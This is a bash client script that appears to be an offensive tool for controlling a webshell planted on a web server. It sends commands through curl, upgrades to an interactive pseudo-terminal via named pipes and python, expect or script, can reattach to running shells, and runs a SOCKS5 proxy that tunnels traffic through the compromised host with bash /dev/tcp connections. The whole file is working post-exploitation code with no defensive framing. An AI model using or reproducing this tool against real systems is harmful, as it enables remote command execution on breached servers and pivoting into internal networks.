#!/bin/bash

#set default stty settings
stty sane

if [ -d "/dev/shm" ]; then
    FIFO_PATH="/dev/shm/.req_stream_$$"
    request_time="/dev/shm/.req_time_$$"
    config_file="/dev/shm/.config.ini_$$"
else
    FIFO_PATH="/tmp/.req_stream_$$"
    request_time="/tmp/.req_time_$$"
    config_file="/tmp/.config.ini_$$"
fi

rm -f $FIFO_PATH; mkfifo $FIFO_PATH;
touch $config_file
exec 5>&1;


exit_client() {
    echo -e "\nExiting script."
    pstree -A -p $$ | grep -Eow "[0-9]+" | grep -v $$ | xargs kill 2>/dev/null
    rm -f $FIFO_PATH
    rm -f $request_time
    rm -f $config_file
    stty sane
    wait
    echo -e "Cleanup complete."
    exit "$1"
}


get_config_value() {
    local setting=$1
    local value=$(grep "^$setting=" "$config_file" | cut -d '=' -f2)
    echo "${value:-}"
}


update_config() {
    local setting=$1
    shift # Shift to the next argument after the setting

    # Combine the remaining arguments into a single string
    local value="${@}"

    # Check if the setting already exists in the configuration file
    if grep -q "^$setting=" "$config_file"; then
        # Setting exists, update its value without escaping forward slashes
        sed -i "s|$setting=.*|$setting=$value|" "$config_file"
    else
        # Setting doesn't exist, add it to the configuration file without escaping forward slashes
        echo "$setting=$value" >> "$config_file"
    fi
}


#SHELL_CUSTOM="bash"
update_config "SHELL_CUSTOM" "bash"
#INIT_SHELL=""
update_config "INIT_SHELL" ""
#interactive="no"
update_config "INTERACTIVE" "no"
#type_stty="no"
update_config "TYPE_STTY" "no"
#path_stty=""
update_config "PATH_STTY" ""
#full_stty="no"
update_config "FULL_STTY" "no"
#alias_set="no"
update_config "ALIAS_SET" "no"
#alias_custom=""
update_config "ALIAS_CUSTOM" ""
#attach="no"
update_config "ATTACH" "no"
#stream="no"
update_config "STREAM" "no"
update_config "SOCKS5_TYPE" "no"
update_config "SOCKS5_PATH" "/dev/shm"
update_config "SOCKS5_PORT" "1080"
#stream_keep_alive=5
update_config "STREAM_KEEP_ALIVE" "5"
URL=""
update_config "URL" ""
FI="/tmp/i"
update_config "FI" "/tmp/i"
FO="/tmp/o"
update_config "FO" "/tmp/o"
CURL_MAXTIME=4
update_config "CURL_MAXTIME" "4"

# List of available arguments
available_args=(
    "--interactive"
    "-i"
    "--stty-raw"
    "--stty-python"
    "--stty-expect"
    "--stty-script"
    "--stty-custom"
    "--shell"
    "--url"
    "-u"
    "--fi"
    "-fi"
    "--fo"
    "-fo"
    "--init-shell"
    "-ish"
    "-curl"
    "--curl"
    "--default"
    "-d"
    "--help"
    "-h"
    "--alias"
    "--alias-custom"
    "--attach"
    "--stream"
    "--socks5-bash"
    "--socks5-path"
    "--socks5-port"
)


help_client () {
    echo -e "Usage: $0 [OPTION]... --url [URL]...\n"
    

    printf "  %s  %-20s%s\n" "-h,   " "--help" "Display help menu"
    printf "  %s  %-20s%s\n" "-u,   " "--url" "The URL to the file: {--url http://localhost:8080/webshell.php}"
    printf "  %s  %-20s%s\n" "-curl," "--curl" "Script communicate with shell by curl. You can add arguments to curl, usage: {--curl '-X POST' -A 'My User-Agent 2.0'}"
    printf "  %s  %-20s%s\n" "-i,   " "--interactive" "Switch to interactive shell."
    printf "  %s  %-20s%s\n" "      " "--stty-raw" "Switch stty to raw mode. Switch to normal mode: {ctrl+alt+s}. While normal mode run switch to raw mode write command: {%:stty_raw}"
    printf "  %s  %-20s%s\n" "      " "--stty-python" "Send command to run python tty mode: {python -c \"import pty; pty.spawn('\$shell')\"}"
    printf "  %s  %-20s%s\n" "      " "--stty-expect" "Send interactive command to run expect tty mode: {0)expect 1)spawn \$shell 2)interact}"
    printf "  %s  %-20s%s\n" "      " "--stty-script" "Send command to run script tty mode: {script -qc /bin/bash /dev/null}"
    printf "  %s  %-20s%s\n" "      " "--stty-custom" "Send command to run custom tty mode: {--stty-custom \"/custom/path/python2.7 -c \\\"import pty; pty.spawn('/bin/zsh')\\\"\"}"
    printf "  %s  %-20s%s\n" "      " "--alias" "Send command for setup alias and export TERM: {export TERM=xterm-256color; alias ls='ls --color'; alias ll='ls -lsaht --color'}"
    printf "  %s  %-20s%s\n" "      " "--alias-custom" "Send command to setup custom alias and other command: {--alias-custom \"export TERM=screen-256color; alias ls='ls --color'; alias ll='ls -lsaht --color'\"}"
    printf "  %s  %-20s%s\n" "      " "--shell" "Change from default 'bash' to any shell for spawning interactive shell and stty: {--shell /usr/sbin/sh} "
    printf "  %s  %-20s%s\n" "-ish, " "--init-shell" "Change default command for spawning interactive shell: {--init-shell \"rm -f /tmp/i /tmp/o; mkfifo /tmp/i /tmp/o; bash -c 'exec 5<>/tmp/i; cat <&5| bash  2>/tmp/o >/tmp/o'\"}"
    printf "  %s  %-20s%s\n" "-fi,  " "--fi" "Interactive shell works on named pipes, so change name of stdin pipe: {--fi /dev/shm/some_input_pipe}"
    printf "  %s  %-20s%s\n" "-fo,  " "--fo" "Interactive shell works on named pipes, so change name of stdout, stderr pipe: {--fo /dev/shm/some_output_pipe}"
    printf "  %s  %-20s%s\n" "-d,   " "--default" "Script by default works with no interactive webshell. So flags set default interacte option: --interactive, --stty-raw, --stty-python, --alias. If you want change some of option you need provide next option after default options. {-d --stty-script --shell /bin/bash}"
    printf "  %s  %-20s%s\n" "      " "--attach" "Join a detached running shell process. To join the right shell, you need to use the same pipes that the shell process uses: {--attach --fi /dev/shm/i --fo /dev/shm/o}"
    printf "  %s  %-20s%s\n" "      " "--stream" "Create request stream. Available for Java Servlet, not working with php: {--stream}"
    printf "  %s  %-20s%s\n" "      " "--socks5-bash" "Create socks5 server. Connection to destination host via bash. You Can set up special path to bash: {--socks5-bash /bin/bash }"
    printf "  %s  %-20s%s\n" "      " "--socks5-path" "Set up path where will save named pipes for each one connection. Default '/dev/shm/': {--socks5-path /tmp }"
    printf "  %s  %-20s%s\n" "      " "--socks5-port" "Set up port for socks5 server by default 1080: {--socks5-port 9050 }"
    printf "  %s  %-20s%s\n" "      " "" "To exit in normal mode stty usage: {ctrl+c} or write: {%:exit}. To exit in raw mode stty usage: {ctrl+alt+q}"

    exit_client "0"
}

while [ "$#" -gt 0 ]; do
    arg="$1"
    case "$arg" in
        "--default" | "-d")
            interactive="yes"
            type_stty="python"
            path_stty="python"
            full_stty="yes"
            alias_set="yes"
            update_config "INTERACTIVE" "yes"
            update_config "TYPE_STTY" "python"
            update_config "PATH_STTY" "python"
            update_config "FULL_STTY" "yes"
            update_config "ALIAS_SET" "yes"
            ;;
        "--interactive" | "-i")
            interactive="yes"
            update_config "INTERACTIVE" "yes"
            ;;
        "--stty-raw")
            full_stty="yes"
            update_config "FULL_STTY" "yes"
            ;;
        "--stty-python")
            type_stty="python"
            update_config "TYPE_STTY" "python"
            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
                shift
                path_stty="$1"
                update_config "PATH_STTY" "$1"
            else
                path_stty="python"
                update_config "PATH_STTY" "python"
            fi
            ;;
        "--stty-script")
            type_stty="script"
            update_config "TYPE_STTY" "script"
            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
                shift
                path_stty="$1"
                update_config "PATH_STTY" "$1"
            else
                path_stty="script"
                update_config "PATH_STTY" "script"
            fi
            ;;
        "--stty-expect")
            type_stty="expect"
            update_config "TYPE_STTY" "expect"
            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
                shift
                path_stty="$1"
                update_config "PATH_STTY" "$1"
            else
                path_stty="expect"
                update_config "PATH_STTY" "expect"
            fi
            ;;
        "--stty-custom")
            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
                type_stty="custom"
                update_config "TYPE_STTY" "custom"
                shift 
                stty_custom="$1"
                update_config "STTY_CUSTOM" "$1"
            else
                echo "[-] Error: Argument missing for --stty-custom"
                exit_client "1"
            fi
            ;;
        "--attach")
            attach="yes"
            interactive="yes"
            update_config "ATTACH" "yes"
            update_config "INTERACTIVE" "yes"
            ;;
        "--alias")
            alias_set="yes"
            update_config "ALIAS_SET" "yes"
            ;;
        "--alias-custom")
            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
                alias_set="custom"
                update_config "ALIAS_SET" "custom"
                shift 
                alias_custom="$1"
                update_config "ALIAS_CUSTOM" "$1"
            else
                echo "[-] Error: Argument missing for --alias-custom"
                exit_client "1"
            fi
            ;;
        "--shell")
            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]];  then
                shift 
                SHELL_CUSTOM="$1"
                update_config "SHELL_CUSTOM" "$1"
            else
                echo "[-] Error: Argument missing for --shell"
                exit_client "1"
            fi
            ;;
        "--url" | "-u")
            if [ -n "$2" ]; then
                shift 
                URL="$1"
                update_config "URL" "$1"
            else
                echo "[-] Error: Argument missing for --url"
                exit_client "1"
            fi
            ;;
        "--init-shell" | "-ish")
            if [ -n "$2" ]; then
                shift 
                INIT_SHELL="$1"
                update_config "INIT_SHELL" "$1"
            else
                echo "[-] Error: Argument missing for --url"
                exit_client "1"
            fi
            ;;
        "--fi" | "-fi")
            if [ -n "$2" ]; then
                shift 
                FI="$1"
                update_config "FI" "$1"
            else
                echo "[-] Error: Argument missing for --url"
                exit_client "1"
            fi
            ;;
        "--fo" | "-fo")
            if [ -n "$2" ]; then
                shift 
                FO="$1"
                update_config "FO" "$1"
            else
                echo "[-] Error: Argument missing for --url"
                exit_client "1"
            fi
            ;;
        "--stream")
            stream="yes"
           # interactive="yes"
            update_config "STREAM" "yes"
           # update_config "INTERACTIVE" "yes"
            ;;
        "--curl" | "-curl")
            type_curl="custom"
            update_config "TYPE_CURL" "custom"
            CURL_ARGS=()
            shift
            while [ "$#" -gt 0 ]; do
                if [[ " ${available_args[@]} " =~ " $1 " ]]; then
                    break  
                else
                    CURL_ARGS+=("$1")
                    update_config "CURL_ARGS" "${CURL_ARGS[@]}"
                    shift
                fi
            done
            continue
            ;;
        "--socks5-bash")
            update_config "SOCKS5_TYPE" "bash"
            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
                shift 
                update_config "SOCKS5_BIN_PATH" "$1"
            else
                update_config "SOCKS5_BIN_PATH" "bash"
            fi
            ;;
        "--socks5-path")
            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
                shift 
                update_config "SOCKS5_PATH" "$1"
            else
                echo "[-] Error: Argument missing for --socks5-path"
                exit_client "1"
            fi
            ;;
        "--socks5-port")
            if [ -n "$2" ] && ! [[ " ${available_args[@]} " =~ " $2 " ]]; then
                shift 
                if [[ $1 =~ ^[1-9][0-9]{0,4}$ && $1 -ge 1 && $1 -le 65535 ]]; then
                    update_config "SOCKS5_PORT" "$1"
                else
                    echo "[-] Error: Argument is invalid port number for --socks5-port"
                    exit_client "1"
                fi

            else
                echo "[-] Error: Argument missing for --socks5-port"
                exit_client "1"
            fi
            ;;
        "--help" | "-h")
            help_client
            ;;
        *)
            echo "Unknown option: $arg"
            exit_client "1"
            ;;
    esac
    shift
done

if [[ "$URL" == "" ]]; then
    echo "[-] Error: Argument missing for --url"
    exit_client "1"
fi

trap 'exit_client "0"' SIGINT 


lcurl () {
    local URL="$(get_config_value "URL")" 
    local CURL_ARGS=()
    eval "CURL_ARGS=($(get_config_value "CURL_ARGS"))" 2>/dev/null
    if [[ " ${CURL_ARGS[@]} " =~ "-X POST" ]]; then
        timeout $CURL_MAXTIME curl -s $URL "${CURL_ARGS[@]}" --data $1 2>1 >/dev/null
    else
        timeout $CURL_MAXTIME curl -s $URL?$1 "${CURL_ARGS[@]}" 2>1 >/dev/null
    fi
}

get_output () {
    local URL="$(get_config_value "URL")" 
    local CURL_ARGS=()
    eval "CURL_ARGS=($(get_config_value "CURL_ARGS"))" 2>/dev/null
    curl -s -N $URL?o=$FO "${CURL_ARGS[@]}" 2>&5 >&5 
}


urlencode() {
  local string="$1"
  local result=""
  local length="${#string}"

  for ((i = 0; i < length; i++)); do
    char="${string:i:1}"
    case "$char" in
      [a-zA-Z0-9.~_-]) result+="$char" ;;
      *) result+="$(printf '%%%02X' "'$char")" ;;
    esac
  done

  echo "$result"
}


create_shell() {
    local INIT_SHELL="$(get_config_value "INIT_SHELL")"
    if [[ "$INIT_SHELL" == "" ]]; then
        local SHELL_CUSTOM="$(get_config_value "SHELL_CUSTOM")"
        shell="rm%20-f%20$FI%20$FO%3B%20mkfifo%20$FI%20$FO%3B%20$SHELL_CUSTOM%20-c%20%27exec%205%3C%3E$FI%3B%20cat%20%3C%265%7C%20$SHELL_CUSTOM%20%202%3E$FO%20%3E$FO%27";
    else
        shell="$(urlencode "$INIT_SHELL")"
    fi
    lcurl "c=$shell"
}

setup_stty() {
    local command_stty=""
    local SHELL_CUSTOM="$(get_config_value "SHELL_CUSTOM")"
    local type_stty="$(get_config_value "TYPE_STTY")"
    if [[ "$type_stty" == "custom" ]]; then
        command_stty=$(urlencode "$stty_custom") 
    elif [[ "$type_stty" == "no" ]]; then
        return 0
    elif [[ "$type_stty" == "python" ]]; then
        local path_stty="$(get_config_value "PATH_STTY")"
        command_stty=$(urlencode "$path_stty -c \"import pty; pty.spawn('$SHELL_CUSTOM')\"") 
    elif [[ "$type_stty" == "expect" ]]; then
        #run interactive 0)expect 1)spawn $SHELL_CUSTOM 2)interact
        local path_stty="$(get_config_value "PATH_STTY")"
        lcurl "i=$path_stty%0A&fi=$FI"
        lcurl "i=$(urlencode "spawn $SHELL_CUSTOM")%0A&fi=$FI"
        lcurl "i=interact%0A&fi=$FI"
    elif [[ "$type_stty" == "script" ]]; then
        local path_stty="$(get_config_value "PATH_STTY")"
        command_stty=$(urlencode "$path_stty -qc $SHELL_CUSTOM /dev/null")
    fi
    lcurl "i=$command_stty%0A&fi=$FI"
    sleep 1 
    local columns=$(tput cols)
    local rows=$(tput lines)
    lcurl "i=stty%20columns%20$columns%20rows%20$rows%0A&fi=$FI"
}

setup_shell() {
    local attach="$(get_config_value "ATTACH")"
    if [[ "$attach" == "no" ]]; then
        create_shell
        get_output &
        setup_stty
        sleep 2
        local alias_set="$(get_config_value "ALIAS_SET")"
        if [[ "$alias_set" == "yes" ]]; then
            #export TERM=xterm-256color; alias ls='ls --color'; alias ll='ls -lsaht --color'
            lcurl "i=%65%78%70%6F%72%74%20%54%45%52%4D%3D%78%74%65%72%6D%2D%32%35%36%63%6F%6C%6F%72%3B%20%61%6C%69%61%73%20%6C%73%3D%27%6C%73%20%2D%2D%63%6F%6C%6F%72%27%3B%20%61%6C%69%61%73%20%6C%6C%3D%27%6C%73%20%2D%6C%73%61%68%74%20%2D%2D%63%6F%6C%6F%72%27%0A&fi=$FI"
        elif [[ "$alias_set" == "custom" ]]; then
            local alias_custom="$(get_config_value "ALIAS_CUSTOM")"
            lcurl "i=$(urlencode "$alias_custom")%0A&fi=$FI"
        fi
    else 
        get_output &
    fi
 
}


keep_alive() {
    while true; do
        current_time=$(date +%s)
        local start_time=$(cat $request_time 2>/dev/null) 
        local elapsed_time=$((current_time - start_time))
        local $stream_keep_alive=$(get_config_alive "STREAM_KEEP_ALIVE")
        if [ "$elapsed_time" -ge "$stream_keep_alive" ]; then
            printf "%s" "%1b%1c" > $FIFO_PATH
            date +%s > $request_time
            continue
        fi
        sleep 1  
    done
}

send_command_stream () {
    exec 7<>$FIFO_PATH
    local URL="$(get_config_value "URL")" 
    local CURL_ARGS=()
    eval "CURL_ARGS=($(get_config_value "CURL_ARGS"))" 2>/dev/null
    curl -s -N -X POST $URL"?s=$FI" "${CURL_ARGS[@]}" -T - <&7 2>1 >/dev/null
    cat $FIFO_PATH >/dev/null
}

send_command_requests () {
    while true; do
        local full_stty=$(get_config_value "FULL_STTY")
        chart=$(cat $FIFO_PATH);
        if [[ "$chart" == "%0A" ]]; then
            lcurl "i=$chart&fi=$FI"
        else
            if [[ "$full_stty" == "yes" ]]; then
                lcurl "i=$(urlencode "$chart")&fi=$FI"
            else
                lcurl "i=$(urlencode "$chart")%0A&fi=$FI"
            fi
        fi
    done
}

send_command() {
    local stream="$(get_config_value "STREAM")"
    if [[ "$stream" == "yes" ]]; then
        keep_alive &
        send_command_stream &
    else 
        send_command_requests &
    fi 
}

read_command_full_stty() {
    local combination=""
    local stream="$(get_config_value "STREAM")"
    while true; do
        # Use dd to read a single byte of raw input
        userInput=$(dd bs=1 count=1 2>/dev/null)
        combination+="$userInput"
        # Check if the user wants to exit
        if [[ "$combination" == *$'\x1b\x11'* ]]; then
            exit_client "0"
        elif [[ "$combination" == *$'\x1b\x13'* ]]; then
            full_stty="no"
            update_config "FULL_STTY" "no"
            echo "Change to normal mode stty!"
            break
        fi
        # Check if Enter key was pressed
        if [[ "$userInput" == $'\x0d' || "$userInput" == $'\x0a' ]]; then
            userInput="%0A"
            combination=""
        fi
        if [[ "$stream" == "yes" ]]; then 
            date +%s > $request_time
            if [[ "$userInput" == "%0A" ]]; then
                printf "%s" "$userInput" >> "$FIFO_PATH"
            else
                printf "%s" "$(urlencode "$userInput")" >> "$FIFO_PATH"
            fi
        else
            printf "%s" "$userInput" >> "$FIFO_PATH"
        fi 
    done
}

read_command_semi_stty() {
    local stream="$(get_config_value "STREAM")"
    while read command; do
        if [[ "$command" == "%:stty_raw" ]]; then
            echo "Change to raw mode stty!"
            full_stty="yes"
            update_config "FULL_STTY" "yes"
            break
        elif [[ "$command" == "%:exit" ]]; then
            exit_client "0"
        else
            if [[ "$stream" == "yes" ]]; then 
                date +%s > $request_time
                printf "%s" "$(urlencode "$command")%0A" >> $FIFO_PATH
            else
                printf "%s" "$command" >> $FIFO_PATH
            fi 
        fi
    done
}


socks5_server () {
    handle_connection_socks5() {
        local URL="$(get_config_value "URL")"
        local socks5_path="$(get_config_value "SOCKS5_PATH")"
        CURL_ARGS=()
        eval "CURL_ARGS=($(get_config_value "CURL_ARGS"))" 2>/dev/null
        pid=$$
        pid_curl=""
        pid_while=""
        stdi="${socks5_path%/}/.$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 6)"
        stdo="${socks5_path%/}/.$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 6)"
        pi="/dev/shm/.s5i_$$"
        exit_string="$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 20)"  #"9762awqGgreTh7231Asa"
        connect_string="$(cat /dev/urandom 2>/dev/null | LC_CTYPE=C tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 20)"  #"c0Nnect_ahsgi8a13Kga"
        mkfifo "$pi"
        exec 4<>"$pi"
                    

    exit_thread () {
        rm -f "$pi" 
        lcurl "i=$exit_string&fi=$stdi"
        if [[ -n "$pid_curl" ]]; then
            pstree -A -p $pid_curl | grep -Eow "[0-9]+" |  xargs kill -15 2>/dev/null
            echo "curl 15" >> /dev/shm/kills
        fi

        if [[ -n "$pid_while" ]]; then
            pstree -A -p $pid_while | grep -Eow "[0-9]+" | xargs kill -15 2>/dev/null
            echo "while 15" >> /dev/shm/kills
        fi
        pstree -A -p $$ | grep -Eow "[0-9]+" | grep -v $$ | xargs kill -15 2>/dev/null
            echo "self 15" >> /dev/shm/kills
        sleep 3
        if [[ -n "$pid_curl" ]]; then
            pstree -A -p $pid_curl | grep -Eow "[0-9]+" | xargs kill -9 2>/dev/null
            echo "curl 9" >> /dev/shm/kills
        fi
        if [[ -n "$pid_while" ]]; then
            pstree -A -p $pid_while | grep -Eow "[0-9]+" | xargs kill -9 2>/dev/null
            echo "while 9" >> /dev/shm/kills
        fi
        pstree -A -p $$ | grep -Eow "[0-9]+" | grep -v $$ | xargs kill -9 2>/dev/null
            echo "self 9" >> /dev/shm/kills
        pstree -A -p $pid | grep -Eow "[0-9]+" | grep -v $pid | xargs kill -15 2>/dev/null
            echo "parretn 15" >> /dev/shm/kills
        sleep 1
        pstree -A -p $pid | grep -Eow "[0-9]+" | grep -v $pid | xargs kill -9 2>/dev/null
        echo "parretn 9" >> /dev/shm/kills
        kill -15 $pid 2>/dev/null
        kill -9 $pid 2>/dev/null
        pstree -A -p $pid | grep -Eow "[0-9]+" | xargs kill -9 2>/dev/null
    }

    trap 'exit_thread "0"' SIGINT 

        lcurl () {
            local CURL_MAXTIME=1
            if [[ " ${CURL_ARGS[@]} " =~ "-X POST" ]]; then
                timeout $CURL_MAXTIME curl -s $URL "${CURL_ARGS[@]}" --data $1 2>1 >/dev/null
            else
                timeout $CURL_MAXTIME curl -s $URL?$1 "${CURL_ARGS[@]}" 2>1 >/dev/null
            fi
        }

        send_data_requests () {
            local stdi=$1
            while true; do
    chart=$(if timeout 0.1 cat - ; then exit_thread "1"; fi | xxd -p | sed 's/\(..\)/%\1/g' | tr -d '\n');
                if ! [[ -p "$pi" ]]; then
                    break
                fi

                if [[ "$chart" != "" ]]; then
                    lcurl "i=$chart&fi=$stdi"
                fi
            done
        }

        connect () {
            local ip="$1"
            local port="$2"
            local stdi="$3"
            local stdo="$4"
            local exit_string="$5"
            local connect_string="$6"

            line="bash+-c+%22%7B+rm+-f+$stdi+$stdo%3B+mkfifo+$stdi+$stdo%3B+exec+4%3C%3E$stdi%3B+exec+5%3C%3E$stdo%3B+exec+3%3C%3E%2Fdev%2Ftcp%2F$ip%2F$port+%26%26+printf+%5C%22%25s%5C%22+%5C%22$connect_string%5C%22+%3E+$stdo+%7C%7C+%7B+printf+%5C%22%25s%5C%22+%5C%22$exit_string%5C%22+%3E+$stdo%3B+sleep+2%3B+rm+-f+$stdi+$stdo%3B+exit%3B+%7D+%3B+cat+%3C%263+%3E$stdo+%26+pid_child%3D%5C%24%21%3B+trap+%27echo+pid%3D%5C%24pid_child%3B+kill+-9+%5C%24pid_child%3B+printf+%5C%22%25s%5C%22+%5C%22$exit_string%5C%22+%3E+$stdo%3B+sleep+2%3B+rm+-f+$stdi+$stdo%3B+kill+-9+%5C%24%5C%24%27+EXIT%3B+while+true%3B+do+IFS%3D+read+-t+0.1+-rd+%27%27+data%3C$stdi%3B+if+%5B+-n+%5C%22%5C%24data%5C%22+%5D%3B+then+if+%5B+%5C%22%5C%24data%5C%22+%3D+%5C%22$exit_string%5C%22+%5D%3B+then+echo+%27exit%27%3B+exit%3B+else+printf+%5C%22%25s%5C%22+%5C%22%5C%24data%5C%22+%3E%263%3B+fi%3B+else+if+%21+kill+-0+%5C%24pid_child+2%3E%2Fdev%2Fnull%3B+then+exit%3B+fi%3B+fi%3B+done%3B+%7D+2%3E%2Fdev%2Fnull%22"
            res=""
            if [[ " ${CURL_ARGS[@]} " =~ "-X POST" ]]; then
                res=$(timeout 10 curl -s $URL "${CURL_ARGS[@]}" --data "c=$line")
            else
                res=$(timeout 10 curl -s $URL"?c=$line" "${CURL_ARGS[@]}") 
            fi
        }
        version=$(timeout 10 dd bs=1 count=1 status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
        if [ "$version" != "\x05" ]; then
            echo -ne "\x05\xff" 
            exit_thread "1"
        fi

        count_methods_auth_hex=$(timeout 10 dd bs=1 count=1 status=none 2>/dev/null | xxd -p | sed 's/\(..\)/\\x\1/g')
        count_methods_auth=$((16#"${count_methods_auth_hex:2:2}"))
        method="false"
        for (( i=1; i<=count_methods_auth; i++ )); do
            method_auth=$(timeout 10 dd bs=1 count=1 status=none 2>/dev/null | xxd -p | sed 's/\(..\)/\\x\1/g')
            if [ "$method_auth" = "\x00" ]; then
                echo -ne "\x05\x00" 
                method="true"
                break
            fi
        done
        if [ "$method" != "true" ]; then
            echo -ne "\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00"
            exit_thread "0"
        fi

        addr_ip=""
        addr_port=""
        domain_length_hex="" 
        domain_length="" 
        ip=""
        port=""
        answer=""

        version=$(timeout 10 dd bs=1 count=1 status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
        if [ "$version" != "\x05" ]; then
            echo -ne "\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00"
            exit_thread "0"
        else
            cmd=$(timeout 10 dd bs=1 count=1 status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
            if [ "$cmd" != "\x01" ]; then
                echo -ne "\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00"
                exit_thread "0"
            else
                reserved_byte=$(timeout 10 dd bs=1 count=1 status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
                if [ "$reserved_byte" != "\x00" ]; then
                    echo -ne "\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00"
                    exit_thread "0"
                else
                    addr_type=$(timeout 10 dd bs=1 count=1 status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
                    if [ "$addr_type" = "\x01" ]; then
                        addr_ip=$(timeout 10 dd bs=1 count=4 status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
                        addr_port=$(timeout 10 dd bs=1 count=2 status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
                        ip="$((16#${addr_ip:2:2})).$((16#${addr_ip:6:2})).$((16#${addr_ip:10:2})).$((16#${addr_ip:14:2}))"
                        port=$((16#$(echo -n $addr_port | tr -d '\\x')))
                        answer="\x05\x00\x00\x01$addr_ip$addr_port"
                    elif [ "$addr_type" = "\x03" ]; then
                        domain_length_hex=$(timeout 10 dd bs=1 count=1 status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
                        domain_length=$((16#"${domain_length_hex:2:2}"))
                        addr_ip=$(timeout 10 dd bs=1 count=$domain_length status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
                        addr_port=$(timeout 10 dd bs=1 count=2 status=none | xxd -p | sed 's/\(..\)/\\x\1/g')
                        ip="$(echo -ne $addr_ip)"
                        port=$((16#$(echo -n $addr_port | tr -d '\\x')))
                        answer="\x05\x00\x00\x03$domain_length_hex$addr_ip$addr_port"
                    else
                        echo -ne "\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00"
                        exit_thread "0"
                    fi

                    connect "$ip" "$port" "$stdi" "$stdo" "$exit_string" "$connect_string" &
                    sleep 0.5
                    (curl -s -N --retry 10 --retry-connrefused --retry-delay 1 "$URL?o=$stdo" "${CURL_ARGS[@]}" | tee "$pi" | dd bs=1024 skip=20 2>/dev/null) &
                    pid_curl=$!

                    check_connection="false"
                    str=""
                    (while true; do
                        chart=$(timeout 0.5 cat "$pi" 2>/dev/null);
                       str+="$chart"
                            
                        if [[ "$str" == *"$exit_string"* ]]; then

                            if [[ "$check_connection" == "false" ]]; then
                                echo -ne "\x05\x04\x00\x01\x00\x00\x00\x00\x00\x00"
                            fi
                            break
                        elif [[ "$str" == *"$connect_string"* ]]; then
                            if [[ "$check_connection" == "false" ]]; then
                                echo -ne "$answer"
                                check_connection="true"
                                continue
                            fi
                        fi
                        if [[ ${#str} -gt 2048 ]]; then
                            str="$chart"
                        fi 
                    done; exit_thread "1") &
                    pid_while=$!
                    send_data_requests "$stdi" 
                fi
            fi
        fi
    }


    export -f handle_connection_socks5
    export -f update_config
    export -f get_config_value
    local socks5_port=$(get_config_value "SOCKS5_PORT")

    socat TCP-LISTEN:$socks5_port,fork EXEC:"env config_file=\"$1\" bash -c 'handle_connection_socks5'" 
    exit 1

}

main () {
    #handler socks5
    local socks5_type="$(get_config_value "SOCKS5_TYPE")"
    if [[ "$socks5_type" != "no" ]]; then
        socks5_server "$config_file" &
        update_config "SOCKS_SERVER_PID" "$!"
    fi
    local interactive="$(get_config_value "INTERACTIVE")"
    if [[ "$interactive" == "yes" ]]; then
        setup_shell 
        send_command 
        while true; do 
            local full_stty="$(get_config_value "FULL_STTY")"
            if [[ "$full_stty" == "yes" ]]; then
                stty raw -echo;
                read_command_full_stty
            else
                stty sane
                read_command_semi_stty
            fi
        done
    else 
        local URL="$(get_config_value "URL")" 
        local CURL_ARGS=()
        eval "CURL_ARGS=($(get_config_value "CURL_ARGS"))" 2>/dev/null
        while read line; do
            if [[ " ${CURL_ARGS[@]} " =~ "-X POST" ]]; then
                curl -s $URL "${CURL_ARGS[@]}" --data "c=$(urlencode "$line")"
            else
                curl -s $URL"?c=$(urlencode "$line")" "${CURL_ARGS[@]}" 
            fi
        done
    fi
}


main


